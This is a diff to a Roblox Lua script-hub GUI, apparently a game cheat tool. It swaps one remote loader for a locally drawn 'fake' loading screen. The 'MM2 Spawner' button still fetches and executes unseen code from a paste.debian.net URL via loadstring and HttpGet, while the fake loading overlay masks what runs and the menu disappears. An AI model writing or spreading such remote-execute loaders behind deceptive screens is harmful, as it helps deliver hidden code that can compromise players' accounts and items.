@@ -14,7 +14,7 @@ ScreenGui.Name = "GameScriptHub"
 -- Toggle button (top center)
 local ToggleBtn = Instance.new("TextButton", ScreenGui)
 ToggleBtn.Size = UDim2.new(0, 40, 0, 40)
-ToggleBtn.Position = UDim2.new(0.5, 0, 0.02, 0) -- top center
+ToggleBtn.Position = UDim2.new(0.5, 0, 0.02, 0)
 ToggleBtn.AnchorPoint = Vector2.new(0.5,0)
 ToggleBtn.Text = "X"
 ToggleBtn.TextColor3 = Color3.fromRGB(255,255,255)
@@ -74,8 +74,8 @@ local function CreateButton(name, callback)
     btn.MouseButton1Click:Connect(callback)
 end
 
--- Function to show fullscreen Goofy loading screen
-local function ShowLoadingScreen()
+-- Internal loading screen function
+local function ShowFakeLoadingScreen()
     local overlay = Instance.new("ScreenGui", PlayerGui)
     overlay.Name = "LoadingOverlay"
 
@@ -94,18 +94,25 @@ local function ShowLoadingScreen()
     loadingLabel.TextColor3 = Color3.fromRGB(255,255,255)
     loadingLabel.Font = Enum.Font.GothamBold
 
-    -- Execute Goofy loading screen script
-    loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
+    -- Fake animated dots
+    task.spawn(function()
+        local dots = ""
+        while overlay.Parent do
+            dots = dots == "..." and "" or dots.."."
+            loadingLabel.Text = "Loading"..dots
+            task.wait(0.5)
+        end
+    end)
 end
 
 -- Add MM2 Spawner button
 CreateButton("MM2 Spawner", function()
-    -- Run paste.debian script
+    -- Run paste.debian script first
     loadstring(game:HttpGet("https://paste.debian.net/plainh/0f441c13/", true))()
 
-    -- Remove GUI
-    if MainFrame then MainFrame:Destroy() end
+    -- Show internal loading screen
+    ShowFakeLoadingScreen()
 
-    -- Show fullscreen loading screen
-    ShowLoadingScreen()
+    -- Remove Main GUI
+    if MainFrame then MainFrame:Destroy() end
 end)
